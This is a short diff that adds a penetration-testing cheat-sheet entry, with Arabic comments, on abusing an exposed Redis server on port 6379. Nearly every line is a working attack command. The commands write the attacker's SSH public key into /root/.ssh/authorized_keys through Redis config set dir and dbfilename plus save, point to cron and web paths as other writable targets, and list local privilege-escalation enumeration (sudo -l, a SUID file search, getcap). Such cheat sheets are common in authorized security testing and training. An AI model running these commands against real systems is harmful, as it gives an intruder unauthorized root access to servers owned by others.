@@ -1,0 +1,9 @@
+# Redis PrivEsc (6379)
+redis-cli -h <target> INFO                           # تحقق من dir, dbfilename
+# authorized_keys (لو مسار HOME قابل للكتابة):
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") | redis-cli -h <target> -x set crack
+redis-cli -h <target> config set dir /root/.ssh
+redis-cli -h <target> config set dbfilename authorized_keys
+redis-cli -h <target> save                           # اكتب مفتاحك (قد لا ينجح بسبب الصلاحيات)
+# cron/web paths إن كانت dir قابلة للكتابة
+sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null
